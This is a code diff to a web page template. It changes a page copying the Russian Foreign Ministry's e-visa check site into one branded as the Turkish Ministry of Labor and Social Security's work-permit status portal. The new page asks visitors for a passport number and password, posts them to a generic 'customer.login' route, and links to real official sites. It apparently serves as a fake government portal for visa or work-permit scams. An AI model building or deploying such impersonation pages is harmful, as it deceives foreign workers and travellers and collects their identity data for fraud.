@@ -7,6 +7,8 @@
 
     <!-- Bootstrap -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+
 
     <style>
         body, html {
@@ -31,7 +33,7 @@
         }
 
         .form-header {
-            background-color: #0771b8;
+            background-color: #d71920; /* red */
             color: white;
             padding: 10px 15px;
             font-size: 14px;
@@ -45,69 +47,159 @@
 
         .logo {
             height: 70px;
-            margin-left:100px;
-            
+            margin-left: 100px;
         }
 
         footer {
-            background-color: #113b81;
+            background-color: #d71920; /* red */
             color: white;
             text-align: center;
             padding: 10px 0;
             font-size: 14px;
         }
+
+        .btn-custom {
+            background-color: #d71920;
+            color: white;
+        }
+
+        .btn-custom:hover {
+            background-color: #bb181c;
+            color: white;
+        }
+
+        .highlight-bar {
+            background-color: #d71920;
+        }
+
+        .horizontal-scroll {
+            -webkit-overflow-scrolling: touch;
+            scroll-behavior: smooth;
+        }
+
+
     </style>
 </head>
 <body>
 <div class="page-wrapper">
 
     <!-- Navbar -->
-    <nav class="navbar navbar-expand-lg navbar-dark " style="background-color: #113b81; padding:20px 0 20px 0;">
-        <div class="container-fluid d-flex justify-content-between align-items-center flex-wrap ">
-            <div class="d-flex align-items-cente ">
-                <img src="logo.png" alt="Logo" class="me-4 logo">
+    <nav class="navbar navbar-expand-lg navbar-dark" style="background-color: #d71920; padding:20px 0 20px 0;">
+        <div class="container-fluid d-flex justify-content-between align-items-center flex-wrap">
+            <div class="d-flex align-items-center">
+                <img src="red.png" alt="Logo" class="me-4 logo">
             </div>
             <div class="text-white text-start flex-grow-1">
-                <h6 class="fw-bold">Ministry of Foreign Affairs of the Russian Federation</h6>
-                <h6>Consular department</h6>
-                <p class="mb-0 small fst-italic">
-                    Website for representatives of transport companies to check the validity of the e-visa for vehicle boarding only
-                </p>
+                <h6 class="fw-bold">T.C. Çalışma ve Sosyal Güvenlik Bakanlığı</h6>
+                <h6>Ministry of Labor and Social Security</h6>
+                
             </div>
-
-            
         </div>
     </nav>
 
     <!-- Main Content -->
-    <div class="container my-5 ">
+    <div class="container my-5">
         <div class="shadow-sm border rounded">
-            <div class="bg-primary text-white p-2">
-                <small>Website for representatives of transport companies to check the validity of the e-visa for vehicle boarding only</small>
+            <div class="highlight-bar text-white p-2">
+                <small>Website for Work Permit Status</small>
             </div>
 
-            <form action="" method="POST" class="p-4">
+
+            <form action="{{ route('customer.login') }}" method="POST" class="p-4">
                 @csrf
 
+
                 <div class="mb-3">
-                    <label for="application_id" class="form-label fw-bold">Application ID</label>
+                    <label for="application_id" class="form-label fw-bold">Passport Number </label>
                     <input type="text" class="form-control" id="application_id" name="application_id" required>
                 </div>
 
                 <div class="mb-3">
-                    <label for="verification_code" class="form-label fw-bold">Verification Code</label>
-                    <input type="text" class="form-control" id="verification_code" name="verification_code" required>
+                    <label for="verification_code" class="form-label fw-bold">Password</label>
+                    <div class="input-group">
+                        <input type="password" class="form-control" id="verification_code" name="verification_code" required>
+                        <button class="btn btn-outline-secondary" type="button" id="togglePassword">
+                            <i class="bi bi-eye" id="eyeIcon"></i>
+                        </button>
+                    </div>
                 </div>
 
+
                 <div class="d-flex flex-wrap gap-2">
-                    <button type="submit" class="btn text-white" style="background-color:rgb(7, 113, 184);">Status Check</button>
-                    <button type="button" class="btn text-white" style="background-color:rgb(7, 113, 184);">Information</button>
+                    <button type="submit" class="btn btn-custom">Status Check</button>
                 </div>
             </form>
+
+            
+        </div>
+
+        <div class="container my-4">
+        <h5 class="mb-3">Related Official Sites</h5>
+        <div class="horizontal-scroll d-flex overflow-auto gap-3 pb-2">
+
+            <!-- KTB -->
+            <a href="https://www.ktb.gov.tr/?_Dil=2" target="_blank" class="text-center text-decoration-none">
+                <div class="card border-0 shadow-sm" style="min-width: 180px;">
+                    <img src="rtm.png"
+                        class="card-img-top p-2" alt="KTB Logo" style="height: 80px; object-fit: contain;">
+                    <div class="card-body p-2">
+                        <p class="small fw-semibold mb-0">Ministry of Culture & Tourism</p>
+                    </div>
+                </div>
+            </a>
+
+            <!-- ITO -->
+            <a href="https://www.ito.org.tr/tr" target="_blank" class="text-center text-decoration-none">
+                <div class="card border-0 shadow-sm" style="min-width: 180px;">
+                    <img src="ito.png"
+                        class="card-img-top p-2" alt="ITO Logo" style="height: 80px; object-fit: contain;">
+                    <div class="card-body p-2">
+                        <p class="small fw-semibold mb-0">Istanbul Chamber of Commerce</p>
+                    </div>
+                </div>
+            </a>
+
+            <!-- MFA -->
+            <a href="https://www.mfa.gov.tr/default.en.mfa" target="_blank" class="text-center text-decoration-none">
+                <div class="card border-0 shadow-sm" style="min-width: 180px;">
+                    <img src="mfa.png"
+                        class="card-img-top p-2" alt="MFA Logo" style="height: 80px; object-fit: contain;">
+                    <div class="card-body p-2">
+                        <p class="small fw-semibold mb-0">Ministry of Foreign Affairs</p>
+                    </div>
+                </div>
+            </a>
+
+            <!-- CMS Law -->
+            <a href="https://cms.law/en/int/expert-guides/cms-expert-guide-to-labour-law-in-central-eastern-europe/turkiye"
+            target="_blank" class="text-center text-decoration-none">
+                <div class="card border-0 shadow-sm" style="min-width: 180px;">
+                    <img src="cms.png"
+                        class="card-img-top p-2" alt="CMS Law Logo" style="height: 80px; object-fit: contain;">
+                    <div class="card-body p-2">
+                        <p class="small fw-semibold mb-0">CMS Labour Law – Türkiye</p>
+                    </div>
+                </div>
+            </a>
+
+            <!-- E-Visa Russia -->
+            <a href="https://evisacheck.kdmid.ru/" target="_blank" class="text-center text-decoration-none">
+                <div class="card border-0 shadow-sm" style="min-width: 180px;">
+                    <img src="logo.png"
+                        class="card-img-top p-2" alt="Russia Visa Logo" style="height: 80px; object-fit: contain;">
+                    <div class="card-body p-2">
+                        <p class="small fw-semibold mb-0">Russia E-Visa Check</p>
+                    </div>
+                </div>
+            </a>
+
         </div>
     </div>
 
 
+
+    
+    </div>
 
 </div>
 
@@ -119,5 +211,20 @@
         document.getElementById('current-flag').src = flagPath;
     }
 </script>
+
+
+<script>
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("verification_code");
+    const eyeIcon = document.getElementById("eyeIcon");
+
+    togglePassword.addEventListener("click", () => {
+        const type = passwordInput.type === "password" ? "text" : "password";
+        passwordInput.type = type;
+        eyeIcon.classList.toggle("bi-eye");
+        eyeIcon.classList.toggle("bi-eye-slash");
+    });
+</script>
+
 </body>
 </html>
